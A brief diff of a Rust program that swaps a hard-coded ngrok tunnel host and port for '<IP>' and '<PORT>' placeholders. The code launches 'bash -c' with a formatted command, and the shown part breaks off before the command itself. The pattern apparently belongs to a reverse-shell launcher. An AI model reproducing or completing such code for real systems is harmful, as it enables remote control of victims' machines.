@@ -1,8 +1,8 @@
 use std::process::Command;
 
 fn main() {
-    let ip = "0.tcp.eu.ngrok.io";
-    let port = "13457";
+    let ip = "<IP>";
+    let port = "<PORT>";
     let _ = Command::new("bash")
         .arg("-c")
         .arg(format!(
